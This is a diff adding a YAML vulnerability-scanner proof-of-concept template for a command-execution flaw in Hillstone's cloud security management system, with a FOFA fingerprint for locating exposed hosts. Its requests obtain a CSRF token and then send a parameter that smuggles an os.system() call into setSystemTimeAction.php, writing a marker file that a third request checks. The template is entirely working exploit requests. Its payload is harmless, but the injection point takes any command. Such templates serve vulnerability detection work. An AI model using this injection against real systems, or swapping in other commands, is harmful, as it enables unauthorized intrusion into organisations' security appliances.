@@ -1,0 +1,44 @@
+id: poc-yaml-hillstonenet-setsystemtimeaction-rce
+info:
+  name: 山石网科云鉴安全管理系统 setsystemtimeaction 命令执行
+  severity: high
+  tags:
+  - rce
+  finger: 山石网科云鉴安全管理系统
+  fofa: body="山石云鉴主机安全管理系统"
+variables:
+  t1: str(random_int(111000,999000))
+  t2: str(random_int(111000111000,999000999000))
+requests:
+- method: POST
+  path: /master/ajaxActions/getTokenAction.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID=emhpeXVhbg;
+  output:
+  - regex_match(body,`(?P<token>^[a-f0-9]{32})`)
+  expression: 'status_code == 200 &&
+
+    matches(body,`(?P<token>^[a-f0-9]{32})`)
+
+    '
+- method: POST
+  path: /master/ajaxActions/setSystemTimeAction.php?token_csrf={{.token}}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID=emhpeXVhbg;
+  data: param=os.system('echo+{{.t2}}+>+/opt/var/majorsec/installation/master/runtime/img/config{{.t1}}')
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /master/img/config{{.t1}}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID=emhpeXVhbg;
+  expression: 'status_code == 200 &&
+
+    trim(body) == t2
+
+    '
+transport: http
